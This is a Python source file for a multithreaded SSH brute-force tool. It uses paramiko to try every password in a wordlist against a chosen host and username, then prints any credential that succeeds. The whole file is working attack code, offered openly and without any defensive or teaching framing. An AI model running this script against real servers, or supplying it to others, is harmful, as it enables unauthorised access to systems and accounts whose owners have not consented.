import paramiko, sys, os, socket, termcolor, threading, time


class SSHBruteForce:

    def  __init__(self, host, username, input_file):
        self.host = host
        self.username = username
        self.input_file = input_file
        self.print_lock = threading.Lock()
        self.found = 0

    
    def checkInputFile(self):
        return os.path.exists(self.input_file)


    def ssh_connect(self, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(self.host, port=22, username=self.username, password= password)
            self.found = 1
            print(termcolor.colored((f"[+] Found : username = {self.username} :: password = {password}"), 'green'))
        except paramiko.AuthenticationException: 
            print(termcolor.colored((f"[-] {password} failed"), 'red'))
        except socket.error as e:
            print(termcolor.colored((f"[-] socket error: {e} "), 'orange'))
        
        ssh.close()

    
    def brute(self):
        if self.checkInputFile() :
            thread  = None
            print(termcolor.colored(("*** Starting SSH brute forcing ***"), "blue"))
            with open(self.input_file, 'r') as file:
                for line in file.readlines():
                    if self.found == 1:
                        thread.join()
                        return 0
                    password = line.strip()
                    thread = threading.Thread(target=self.ssh_connect, args=(password, ))
                    thread.start()
                    time.sleep(0.5)
        else:
            print(termcolor.colored((f"[-] {self.input_file} does not exists "), 'red'))
            return 1